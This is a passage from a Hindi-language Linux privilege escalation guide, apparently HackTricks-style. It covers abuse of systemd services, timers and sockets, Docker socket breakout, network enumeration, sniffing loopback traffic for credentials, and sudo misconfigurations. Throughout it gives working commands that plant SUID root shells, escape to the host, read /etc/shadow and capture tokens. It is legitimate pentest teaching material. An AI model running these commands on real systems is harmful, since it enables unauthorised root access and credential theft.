जाँचें कि क्या आप किसी `.service` फाइल को लिख सकते हैं, अगर कर सकते हैं तो आप इसे संशोधित कर सकते हैं ताकि यह आपके **backdoor** को तब **निष्पादित** करे जब सर्विस **शुरू** हो, **restarted** या **stopped** (शायद आपको मशीन के रीबूट होने तक इंतजार करना पड़े)।\
उदाहरण के लिए अपनी backdoor को .service फ़ाइल के अंदर बनायें, जैसे **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि अगर आपके पास **write permissions over binaries being executed by services**, तो आप उन्हें बदलकर backdoors डाल सकते हैं ताकि जब services फिर से execute हों तो backdoors चल जाएँ।

### systemd PATH - Relative Paths

आप systemd द्वारा उपयोग किए गए PATH को निम्नलिखित से देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप path के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप संभवतः **escalate privileges** कर पाएंगे। आपको **relative paths being used on service configurations** फ़ाइलों के लिए खोज करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, एक **executable** बनाएं जिसका नाम **same name as the relative path binary** हो और उसे उस systemd PATH फ़ोल्डर के अंदर रखें जिस पर आप लिख सकते हैं, और जब सेवा से कमजोर क्रिया (**Start**, **Stop**, **Reload**) को निष्पादित करने के लिए कहा जाएगा, तो आपकी **backdoor will be executed** (unprivileged users आमतौर पर सेवाओं को शुरू/रोक नहीं सकते, लेकिन जाँच करें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में अधिक जानने के लिए `man systemd.service` पढ़ें।**

## **Timers**

**Timers** systemd unit फाइलें हैं जिनका नाम `**.timer**` पर समाप्त होता है और जो `**.service**` फाइलों या घटनाओं को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in समर्थन होता है और इन्हें asynchronous रूप से चलाया जा सकता है।

आप सभी timers को निम्नलिखित कमांड से सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं, तो आप इसे systemd.unit की कुछ मौजूदा इकाइयों (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> इस timer के समाप्त होने पर सक्रिय करने के लिए unit। आर्ग्युमेंट एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम timer unit के समान होता है, सिवाय suffix के। (ऊपर देखें.) यह अनुशंसित है कि सक्रिय होने वाला unit नाम और timer unit का unit नाम suffix के अलावा समान हों।

Therefore, to abuse this permission you would need to:

- किसी systemd unit (जैसे `.service`) को खोजें जो **एक writable binary execute कर रहा हो**
- किसी systemd unit को खोजें जो **एक relative path execute कर रहा हो** और आपके पास **systemd PATH** पर **writable privileges** हों (उस executable का impersonate करने के लिए)

**Learn more about timers with `man systemd.timer`.**

### **Timer को सक्षम करना**

Timer को enable करने के लिए आपको root privileges चाहिए और निम्न execute करना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) समान या अलग मशीनों पर client-server मॉडल के भीतर प्रक्रियाओं के बीच संचार (process communication) सक्षम करते हैं। वे इंटर-कम्प्यूटर संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फ़ाइलों के माध्यम से सेटअप किए जाते हैं।

Sockets को `.socket` फ़ाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**Learn more about sockets with `man systemd.socket`.** इस फ़ाइल के अंदर, कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं लेकिन एक सारांश उपयोग किया जाता है ताकि यह संकेत दिया जा सके कि यह किस पर सुनने वाला है (AF_UNIX socket फ़ाइल का पथ, IPv4/6 और/या सुनने के लिए port number, आदि)
- `Accept`: boolean argument लेता है। यदि **true**, तो **प्रत्येक आने कनेक्शन के लिए एक service instance spawn** किया जाता है और केवल connection socket को ही उसमे पास किया जाता है। यदि **false**, तो सभी listening sockets स्वयं ही **started service unit को पास** किए जाते हैं, और सभी कनेक्शनों के लिए केवल एक service unit spawn होता है। यह मान datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक ही service unit अनिवार्य रूप से सभी आने वाले ट्रैफिक को संभालता है। **Defaults to false**. प्रदर्शन कारणों से, नए daemons केवल `Accept=no` के अनुकूल तरीके से लिखने की सिफारिश की जाती है।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेता है, जिन्हें listening **sockets**/FIFOs को **create** और bind किए जाने से पहले या बाद में क्रमशः **execute** किया जाता है। command line का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs को **close** और remove किए जाने से पहले या बाद में क्रमशः **execute** किए जाते हैं।
- `Service`: उस **service** unit का नाम निर्दिष्ट करता है **जिसे सक्रिय किया जाएगा** आने वाले ट्रैफिक पर। यह सेटिंग केवल Accept=no वाले sockets के लिए ही अनुमति है। यह उस service पर default होता है जिसका नाम socket के समान होता है (suffix बदला हुआ)। अधिकांश मामलों में, इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आपको कोई **writable** `.socket` फ़ाइल मिलती है तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बने जाने से पहले execute हो जाएगा। इसलिए, आपको **शायद मशीन के reboot होने तक इंतज़ार करना पड़े।**\
_ध्यान दें कि सिस्टम को उस socket फ़ाइल कॉन्फ़िगरेशन का उपयोग कर रहा होना चाहिए अन्यथा backdoor execute नहीं होगा_

### Socket activation + writable unit path (create missing service)

एक और हाई-इम्पैक्ट मिसकनफ़िगरेशन है:

- एक socket unit जिसमें `Accept=no` और `Service=<name>.service`
- संदर्भित service unit गायब है
- एक attacker `/etc/systemd/system` (या किसी अन्य unit search path) में लिख सकता है

ऐसी स्थिति में, attacker `<name>.service` बना सकता है, फिर socket पर ट्रैफ़िक trigger करके systemd को नया service load और root के रूप में execute करने के लिए मजबूर कर सकता है।

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### लिखने योग्य sockets

यदि आप **कोई writable socket पहचानते हैं** (_अब हम Unix Sockets की बात कर रहे हैं और config `.socket` फाइलों की नहीं_), तो **आप उस socket के साथ communicate कर सकते हैं** और संभवतः किसी vulnerability को exploit कर सकते हैं।

### Unix Sockets को सूचीबद्ध करें
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ बल्कि उन फाइलों की बात कर रहा हूँ जो unix sockets के रूप में काम करती हैं_). आप इसे निम्न से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
यदि socket **responds with an HTTP** request, तो आप **communicate** कर सकते हैं और शायद **exploit some vulnerability** कर सकते हैं।

### लिखने योग्य Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित रखना चाहिए। डिफ़ॉल्ट रूप से, यह `root` user और `docker` group के सदस्यों द्वारा लिखने योग्य होता है। इस socket पर write access होने से privilege escalation हो सकता है। यहां बताया गया है कि इसे कैसे किया जा सकता है और वैकल्पिक तरीके अगर Docker CLI उपलब्ध न हो।

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको होस्ट की फ़ाइल सिस्टम पर root-level access के साथ एक container चलाने की अनुमति देते हैं।

#### **Docker API का सीधा उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को फिर भी Docker API और `curl` कमांड्स के माध्यम से manipulate किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** ऐसा request भेजें जो host सिस्टम की root directory को mount करता हुआ एक container बनाए।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए container को start करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container के साथ कनेक्शन स्थापित करें, जिससे इसके भीतर कमांड execute करने में सक्षम हों।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`Socat` कनेक्शन सेट करने के बाद, आप container के भीतर सीधे कमांड चला सकते हैं और होस्ट की फ़ाइलसिस्टम पर root-level access प्राप्त कर सकते हैं।

### Others

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

containers से बाहर निकलने या container runtimes का दुरुपयोग करके privileges escalate करने के और तरीके देखें:

{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आपको पता चलता है कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **आप इसे दुरुपयोग करके privileges escalate कर सकते हैं**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आपको पता चलता है कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि **आप इसे दुरुपयोग करके privileges escalate कर सकते हैं**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत inter-Process Communication (IPC) system है जो applications को कुशलता से interact और data साझा करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया, यह विभिन्न प्रकार के application communication के लिए एक मजबूत framework प्रदान करता है।

यह सिस्टम बहुमुखी है, basic IPC का समर्थन करता है जो processes के बीच data के आदान-प्रदान को बेहतर बनाता है, और यह **enhanced UNIX domain sockets** की याद दिलाता है। इसके अलावा, यह घटनाओं या signals को broadcast करने में मदद करता है, जिससे सिस्टम के घटकों के बीच seamless integration संभव होता है। उदाहरण के लिए, एक Bluetooth daemon से आने वाली incoming call की signal एक music player को mute करने के लिए प्रेरित कर सकती है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system का समर्थन करता है, जो applications के बीच service requests और method invocations को सरल बनाता है और पारंपरिक रूप से जटिल प्रक्रियाओं को सुव्यवस्थित करता है।

D-Bus एक **allow/deny model** पर संचालित होता है, जो matching policy rules के cumulative प्रभाव के आधार पर message permissions (method calls, signal emissions, आदि) को manage करता है। ये policies bus के साथ interactions को निर्दिष्ट करती हैं, और इन permissions के exploitation के माध्यम से संभावित रूप से privilege escalation की अनुमति दे सकती हैं।

ऐसी एक policy का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user के लिए `fi.w1.wpa_supplicant1` का मालिक होने, उसे संदेश भेजने और उससे संदेश प्राप्त करने की permissions को विस्तार से बताता है।

यदि policies में कोई निर्दिष्ट user या group नहीं है तो वे सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट policies द्वारा कवर नहीं हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ कैसे enumerate और exploit एक D-Bus communication किया जाए सीखें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति पता लगाना हमेशा दिलचस्प होता है।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### आउटबाउंड फ़िल्टरिंग त्वरित ट्रायाज

यदि host कमांड्स चला सकता है लेकिन callbacks विफल हो रहे हैं, तो जल्दी से DNS, transport, proxy, और route फ़िल्टरिंग अलग करें:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

हमेशा उन network services को जांचें जो उस machine पर चल रहे हैं जिनसे आप पहुँचने से पहले interact नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
listeners को bind target के अनुसार वर्गीकृत करें:

- `0.0.0.0` / `[::]`: सभी स्थानीय इंटरफेस से पहुँच योग्य।
- `127.0.0.1` / `::1`: केवल स्थानीय (अच्छे tunnel/forward candidates)।
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): सामान्यतः केवल internal segments से ही पहुँच योग्य।

### स्थानीय-केवल सेवा ट्रायाज वर्कफ़्लो

जब आप किसी host को compromise करते हैं, तो `127.0.0.1` पर बाइंड की गई सेवाएँ अक्सर पहली बार आपकी shell से पहुँच योग्य हो जाती हैं। एक त्वरित local workflow है:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS को नेटवर्क स्कैनर के रूप में (network-only mode)

स्थानीय PE चेक्स के अलावा, linPEAS एक केंद्रित नेटवर्क स्कैनर के रूप में चल सकता है।  
यह `$PATH` में उपलब्ध binaries का उपयोग करता है (आमतौर पर `fping`, `ping`, `nc`, `ncat`) और कोई tooling इंस्टॉल नहीं करता।
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
यदि आप `-d`, `-p`, या `-i` को `-t` के बिना पास करते हैं, linPEAS शुद्ध network scanner की तरह व्यवहार करता है (बाकी privilege-escalation checks छोड़ते हुए).

### Sniffing

जाँच करें कि क्या आप sniff traffic कर सकते हैं। यदि कर पाते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
त्वरित व्यावहारिक जाँचें:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) post-exploitation में विशेष रूप से मूल्यवान है क्योंकि कई केवल आंतरिक सेवाएँ वहाँ tokens/cookies/credentials उजागर करती हैं:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
अब Capture करें, बाद में parse करें:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

जांचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन से **users** हैं, कौन-कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

कुछ Linux वर्शन एक बग से प्रभावित थे जो उन उपयोगकर्ताओं को जिनका **UID > INT_MAX** है, root privileges बढ़ाने की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप किसी ऐसे समूह के **सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जांचें कि क्लिपबोर्ड के अंदर कुछ रोचक तो नहीं है (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप **कोई भी पासवर्ड जानते हैं** तो उस पासवर्ड का उपयोग करके **प्रत्येक user के रूप में लॉगिन करने का प्रयास करें**।

### Su Brute

यदि आप बहुत शोर करने की परवाह नहीं करते और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user पर brute-force आज़मा सकते हैं.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी users पर brute-force करने की कोशिश करता है।

## लिखने योग्य PATH का दुरुपयोग

### $PATH

यदि आप पाते हैं कि आप **$PATH के किसी फ़ोल्डर के अंदर लिख सकते हैं** तो आप privileges escalate कर सकते हैं: **लिखने योग्य फ़ोल्डर के अंदर backdoor बनाकर** ऐसे नाम से जो किसी command का होगा जिसे किसी दूसरे user (आदर्श रूप से root) द्वारा execute किया जाएगा और जो $PATH में आपके लिखने योग्य फ़ोल्डर से पहले स्थित किसी फ़ोल्डर से **लोड नहीं होता**।

### SUDO and SUID

आपको sudo का उपयोग करके कुछ command execute करने की अनुमति हो सकती है या उन पर suid बिट सेट हो सकता है। इसे जांचें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित कमांड आपको फ़ाइलें पढ़ने और/या लिखने या यहाँ तक कि कोई कमांड निष्पादित करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration किसी उपयोगकर्ता को बिना पासवर्ड जाने किसी अन्य उपयोगकर्ता के privileges के साथ कुछ command execute करने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है, अब root directory में एक ssh key जोड़कर या `sh` कॉल करके shell पाना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी चीज़ को निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **असुरक्षित** था **PYTHONPATH hijacking** के लिए, जिससे स्क्रिप्ट को root के रूप में निष्पादित करते समय कोई भी python library लोड की जा सकती थी:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep द्वारा संरक्षित → root shell

यदि sudoers `BASH_ENV` (उदा., `Defaults env_keep+="ENV BASH_ENV"`) को संरक्षित करता है, तो आप Bash की नॉन-इंटरएक्टिव स्टार्टअप व्यवहार का लाभ उठाकर अनुमति प्राप्त कमांड को invoke करते समय arbitrary code को root के रूप में चला सकते हैं।

- Why it works: नॉन-इंटरएक्टिव शेल्स में, Bash `$BASH_ENV` का मूल्यांकन करता है और target script चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम script या shell wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फ़ाइल root privileges के साथ source की जाती है।

- Requirements:
- एक sudo नियम जो आप चला सकें (कोई भी target जो `/bin/bash` को नॉन-इंटरैक्टिव तरीके से invoke करता है, या कोई भी bash script)।
- `BASH_ENV` `env_keep` में मौजूद हो (जाँच के लिए `sudo -l`)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- हार्डनिंग:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-अनुमति वाले कमांड्स के लिए shell wrappers से बचें; न्यूनतम बाइनरीज़ का उपयोग करें।
- जब preserved env vars का उपयोग हो तो sudo I/O लॉगिंग और अलर्टिंग पर विचार करें।

### Terraform sudo के माध्यम से preserved HOME के साथ (!env_reset)

यदि sudo environment को अछूता छोड़ता है (`!env_reset`) जबकि `terraform apply` की अनुमति देता है, तो `$HOME` कॉल करने वाले उपयोगकर्ता जैसा ही बना रहता है। इसलिए Terraform root के रूप में **$HOME/.terraformrc** लोड करता है और `provider_installation.dev_overrides` का सम्मान करता है।

- आवश्यक provider को एक writable directory पर निर्देशित करें और provider के नाम वाला एक malicious plugin डालें (उदा., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform will fail the Go plugin handshake but executes the payload as root before dying, leaving a SUID shell behind.

### TF_VAR overrides + symlink validation bypass

Terraform variables can be provided via `TF_VAR_<name>` environment variables, which survive when sudo preserves the environment. Weak validations such as `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` can be bypassed with symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink को resolve करता है और असली `/root/root.txt` को attacker-readable destination में कॉपी कर देता है। वही तरीका privileged paths में **लिखने** के लिए इस्तेमाल किया जा सकता है अगर destination symlinks पहले से बना दिए जाएं (उदा., provider’s destination path को `/etc/cron.d/` के अंदर पॉइंट करते हुए)।

### requiretty / !requiretty

कुछ पुराने distributions पर, sudo को `requiretty` के साथ configured किया जा सकता है, जो sudo को केवल interactive TTY से ही चलाने के लिए मजबूर करता है। यदि `!requiretty` सेट है (या यह option अनुपस्थित है), तो sudo को non-interactive contexts जैसे reverse shells, cron jobs, या scripts से execute किया जा सकता है।
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

अगर `sudo -l` में `env_keep+=PATH` दिखता है या `secure_path` में attacker-writable entries (उदा., `/home/<user>/bin`) शामिल हैं, तो sudo-allowed target के अंदर कोई भी relative command shadow किया जा सकता है।

- आवश्यकताएँ: एक sudo नियम (अक्सर `NOPASSWD`) जो ऐसा script/binary चलाता है जो absolute paths के बिना commands (`free`, `df`, `ps`, आदि) को कॉल करता है, और एक writable PATH entry जो पहले search किया जाता है।
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo निष्पादन बायपास करने वाले पथ
**कूदें** अन्य फ़ाइलें पढ़ने के लिए या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**रोकथाम**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

यदि किसी एक कमांड को **sudo permission** बिना path निर्दिष्ट किए दी गई है: _hacker10 ALL= (root) less_ तो आप इसे PATH variable बदलकर exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
